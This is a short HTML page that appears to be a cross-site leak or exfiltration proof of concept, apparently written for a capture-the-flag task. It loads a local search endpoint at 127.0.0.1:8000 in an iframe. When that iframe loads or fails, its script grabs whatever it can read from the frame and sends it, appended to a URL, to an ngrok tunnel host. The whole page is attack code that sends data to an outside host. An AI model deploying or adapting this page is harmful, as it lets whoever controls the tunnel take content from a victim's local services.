
<html>
    <head>
        <script>
                  let text = "";
            
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")
                try {
                    if (document.getElementsByTagName("iframe")[0]) {
                        text = "iframe"
                    }

                        text = document.getElementsByTagName("iframe")[0].innerHTML
                    
                        }
                    catch (error) {
                        text = error
                    }
                
                  iframe.src = "https://nonspirited-zoie-bilocular.ngrok-free.dev/" + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
            
          <iframe src="http://127.0.0.1:8000/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()">
              <script>
                text = document.getElementsByTagName("pre")[0].textContent || "TQ"
            </script>
          </iframe>
      </body>
</html>
